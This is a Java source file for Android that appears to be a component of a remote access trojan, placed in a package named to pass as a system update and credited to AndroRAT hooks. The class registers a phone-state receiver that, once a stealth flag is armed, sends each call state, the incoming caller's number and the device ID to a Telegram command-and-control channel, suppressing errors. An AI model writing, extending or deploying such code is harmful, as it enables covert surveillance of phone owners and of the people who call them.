package com.system.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.TelephonyManager;

/** Call state monitor — pattern from public AndroRAT phone-state hooks. */
public final class PhoneStateWatch {
    private static boolean reg;

    private PhoneStateWatch() {}

    public static void start(Context ctx) {
        if (reg) return;
        try {
            IntentFilter f = new IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED);
            ctx.getApplicationContext().registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context c, Intent i) {
                    if (!Stealth.isArmed(c)) return;
                    try {
                        String st = i.getStringExtra(TelephonyManager.EXTRA_STATE);
                        String num = i.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                        Telegram.send("☎️ CALL_STATE id=" + C2.getDeviceId()
                                + "\nstate=" + st + "\nnum=" + num);
                    } catch (Throwable ignored) {}
                }
            }, f);
            reg = true;
        } catch (Throwable t) {
            Telegram.reportEvent(C2.getDeviceId(), "phone_reg_err:" + t.getMessage());
        }
    }
}
